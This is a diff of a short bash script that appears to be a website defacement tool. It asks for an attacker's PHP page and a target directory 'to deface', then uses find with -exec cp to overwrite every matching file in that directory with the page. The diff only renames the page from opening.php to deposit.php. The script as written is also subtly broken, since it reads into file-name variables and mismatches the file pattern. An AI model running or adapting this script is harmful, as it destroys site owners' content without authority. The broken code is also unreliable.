@@ -1,11 +1,11 @@
 #!/bin/bash
-echo '[+] your opening.php path on the server'
-read opening.php 
+echo '[+] your deposit.php path on the server'
+read deposit.php 
 echo
 echo '[+] enter the path To deface '
 read path
 echo
 echo '[+] Starting ........'
-find $path -name "opening.php.*" -exec cp $opening.php {} \;
+find $path -name "opening.php.*" -exec cp $deposit.php {} \;
 echo 
 echo '[+] Done !'
